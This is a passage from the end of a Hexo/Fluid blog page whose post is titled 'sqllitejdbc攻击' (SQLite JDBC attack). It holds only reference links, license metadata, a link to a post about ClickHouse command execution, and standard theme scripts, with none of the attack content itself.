+<h3 id="refence"><a href="#refence" class="headerlink" title="refence"></a>refence</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/JY1C2LqOqbAQvJLIhG8prQ">https://mp.weixin.qq.com/s/JY1C2LqOqbAQvJLIhG8prQ</a></p>
+<p><a href="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/">https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sqllitejdbc攻击</div>
+      <div>https://unam4.github.io/2025/03/17/sqllitejdbc攻击/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>unam4</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/21/%E4%BB%8Edeepseek%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A2%E7%B4%A2clickhouse%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="从deepseek未授权探索clickhouse命令执行">
+                        <span class="hidden-mobile">从deepseek未授权探索clickhouse命令执行</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'unam4/unam4-commect');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
